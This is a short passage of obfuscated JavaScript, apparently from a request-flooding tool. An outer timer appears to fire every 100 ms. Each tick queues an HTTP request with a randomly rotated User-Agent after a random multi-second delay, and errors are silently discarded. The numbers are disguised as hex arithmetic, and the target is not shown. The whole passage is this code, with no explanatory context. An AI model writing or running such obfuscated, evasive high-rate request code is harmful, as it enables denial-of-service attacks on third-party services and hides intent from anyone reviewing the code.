      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x3bb * 0x2 + 0x593 * -0x3 + 0x249b) * getRandomInt(0x68b + 0x1ee8 + -0x2572 * 0x1, 0x207a + 0x2197 * -0x1 + -0x1d * -0xa));
}, 0x6dc + -0xd * -0x4f + -0xa7b);